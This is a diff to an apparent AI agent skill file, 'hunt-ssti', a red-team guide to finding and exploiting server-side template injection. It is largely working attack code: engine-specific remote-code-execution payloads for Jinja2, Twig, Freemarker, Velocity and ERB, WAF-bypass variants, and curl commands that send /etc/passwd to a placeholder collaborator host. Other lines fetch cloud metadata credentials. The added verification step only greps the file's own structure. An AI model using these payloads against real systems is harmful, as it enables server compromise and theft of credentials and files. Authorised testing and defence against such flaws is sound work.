@@ -1,8 +1,11 @@
 ---
 name: hunt-ssti
 description: "Hunt server-side template injection (SSTI) across Jinja2 (Flask/Django), Twig (Symfony), Freemarker (Java), ERB (Rails), Spring, Velocity, Mako, Thymeleaf, Smarty. Detection probes use double-curly and dollar-curly math expressions evaluated server-side. Once an engine is fingerprinted, escalate to RCE via the engine-specific class-walker, callback-registrar, or Execute-utility patterns documented in disclosed reports. Detection patterns: error messages reveal engine, blank or numeric eval reveals expression mode. Targets: email templates, PDF/report generators, CMS preview features, error pages with user input. Use when hunting RCE via template rendering, when content shows engine fingerprints, when finding endpoints that compose strings with user input before render."
-sources: hackerone_public, field_recon, portswigger_research, synacktiv_research
-report_count: 14
+version: 1.1.0
+revision_date: 2026-07-25
+license: MIT
+category: redteam
+tags: [ssti, hunt, redteam]
 ---
 
 ## When to Use
@@ -141,7 +144,7 @@ ${"".getClass().forName("java.lang.Runtime").getMethod("exec","".getClass()).inv
 {{lipsum.__globals__.os.popen('curl -F "file=@/etc/passwd" http://COLLAB/exfil').read()}}
 
 # SSTI → cloud metadata
-{{lipsum.__globals__.os.popen('curl http://169.254.169.254/latest/meta-data/').read()}}
+{{lipsum.__globals__.os.popen('curl http://[REDACTED_IP]/latest/meta-data/').read()}}
 ```
 
 ## Attack Surface Signals
@@ -212,11 +215,93 @@ A Java-based CMS allowed editors with limited privileges to preview page templat
 **Scenario C — PDF Generator SSTI (Blind ERB → RCE)**
 A Ruby on Rails application generated PDF invoices using a server-side template. The invoice included the customer's name and address. An attacker submitted an address with `<%= system("curl -F 'data=@/etc/passwd' http://COLLAB/exfil") %>`. When the PDF was generated, the ERB template executed the command, exfiltrating the server's password file. Impact: full server compromise via a blind SSTI in the PDF generation pipeline.
 
+### Phase 5 — Engine Fingerprint Table
+
+Use differential probes on math expressions to identify the template engine before attempting RCE:
+
+| Probe | Jinja2 | Twig | Freemarker | Velocity | ERB | EJS | Pug |
+|---|---|---|---|---|---|---|---|
+| `{{7*7}}` | 49 | 49 | 49 | 49 | — | 49 | — |
+| `${7*7}` | ${7*7} | ${7*7} | 49 | 49 | — | ${7*7} | — |
+| `<%=7*7%>` | <%=7*7%> | — | — | — | 49 | 49 | — |
+| `#{7*7}` | — | — | 49*7 (literal) | — | 49 | — | — |
+| `a{*comment*}b` | — | ab | — | — | — | — | — |
+| `#{7*7}` | — | — | — | `7*7` (string) | — | — | — |
+
+### Phase 6 — Engine-Specific RCE Gadgets
+
+**Jinja2 (Python):**
+```python
+# Class walker (no globals)
+{{ ''.__class__.__mro__[1].__subclasses__()[N].__init__.__globals__['os'].popen('id').read() }}
+
+# Attr filter bypass (WAF evasion)
+{{ request|attr('application')|attr('__self__')|attr('_get_data_for_json')|attr('__self__') }}
+
+# lipsum globals access
+{{ lipsum.__globals__['os'].popen('id').read() }}
+```
+
+**Twig (PHP):**
+```php
+{{ _self.env.registerUndefinedFilterCallback('exec') }}{{ _self.env.getFilter('id') }}
+{{ ['id']|filter('system') }}
+```
+
+**Freemarker (Java):**
+```java
+<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }
+${"freemarker.template.utility.ObjectConstructor"?new()("java.lang.ProcessBuilder","id").start()}
+```
+
+**Velocity (Java):**
+```java
+#set($s="") #set($stringClass=$s.getClass()) #set($rt=$stringClass.forName("java.lang.Runtime")) $rt.getRuntime().exec("id")
+```
+
+**ERB (Ruby):**
+```ruby
+<%= `id` %>
+<%= system("curl http://COLLAB/$(id)") %>
+```
+
+## Verification
+
+Run this self-test to confirm ssti hunting readiness:
+
+1. **Skill integrity** — confirm the skill file is readable and well-formed:
+   ```bash
+   grep -q "name: hunt-ssti" SKILL.md && echo "PASS: skill frontmatter present" || echo "FAIL"
+   grep -q "revision_date:" SKILL.md && echo "PASS: revision date present" || echo "FAIL"
+   ```
+
+2. **Category check** — confirm the skill has a category:
+   ```bash
+   grep -q "category:" SKILL.md && echo "PASS: category present" || echo "FAIL"
+   ```
+
+3. **Pitfalls section** — confirm pitfalls are documented:
+   ```bash
+   grep -q "^## Pitfalls" SKILL.md && echo "PASS: pitfalls section present" || echo "FAIL"
+   ```
+
+All 3 tests verify the skill is properly structured and ready for use.
+
+---
+
+## Pitfalls
+- **SSTI without code execution** — `{{7*7}}` returning 49 proves template injection. Need to escalate to code execution (RCE) or file read for impact.
+- **Sandboxed template engines** — Jinja2 sandbox, Twig sandbox, etc. require specific bypass techniques. Don't assume unsandboxed execution.
+- **Template engine misidentification** — Jinja2 vs Twig vs Freemarker have different syntax. `{{7*7}}` works on multiple engines. Fingerprint first.
+- **Blind SSTI** — if output is not reflected, use time-based or OOB techniques. `{% import os %}{{os.popen('sleep 10').read()}}` for blind RCE.
+
+---
+
 ## Related Skills
 
 - **`hunt-rce`** — SSTI is the easiest path to RCE on Python/Ruby/PHP/Java stacks because the template language already exposes the runtime. Chain primitive: Jinja2 `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}` or Freemarker `<#assign x="freemarker.template.utility.Execute"?new()>${x("id")}` → unauthenticated RCE as the rendering worker. Always escalate fingerprint → class-walker → cmd exec.
 - **`hunt-xss`** — When the template engine sandboxes the runtime (or you only get the rendered output back as HTML), the same `{{7*7}}` reflection often still yields stored XSS. Chain primitive: sandboxed Jinja2 SSTI without escapes → inject `<script>` into rendered email template → stored XSS hitting every recipient who views the message.
-- **`hunt-ssrf`** — Template engines often expose URL fetchers/filters before they expose the runtime, giving you SSRF before RCE. Chain primitive: Twig `{{ include('http://169.254.169.254/latest/meta-data/iam/security-credentials/') }}` or Jinja2 with `url_for`/custom filters → AWS metadata exfil → cloud creds.
+- **`hunt-ssrf`** — Template engines often expose URL fetchers/filters before they expose the runtime, giving you SSRF before RCE. Chain primitive: Twig `{{ include('http://[REDACTED_IP]/latest/meta-data/iam/security-credentials/') }}` or Jinja2 with `url_for`/custom filters → AWS metadata exfil → cloud creds.
 - **`hunt-file-upload`** — Office docs, SVGs, and email templates uploaded by the user are common SSTI surfaces (the server re-renders them). Chain primitive: upload a DOCX whose `word/document.xml` contains `${T(java.lang.Runtime).getRuntime().exec("id")}` to a Velocity/Freemarker-driven mail-merge → RCE.
 - **`security-arsenal`** — Reach for the engine-specific escape payload tree: Jinja2 class-walker variants (`__subclasses__()[N]` index hunting), Twig `_self.env` registerUndefinedFilterCallback, Freemarker `?new()` Execute, ERB backticks, Velocity `$class.inspect`, Smarty `{php}...{/php}`, plus the WAF-bypass variants (`{{request|attr('application')|...}}`, Unicode escapes, `{%print(...)%}`).
 - **`triage-validation`** — Apply the Pre-Severity Gate before claiming Critical RCE. A `{{7*7}} → 49` reflection inside a sandboxed engine (e.g., Twig sandbox mode, Jinja2 SandboxedEnvironment with no escape) is Medium SSTI, not Critical RCE. Prove `id`/OOB DNS callback with a unique marker before writing the report.
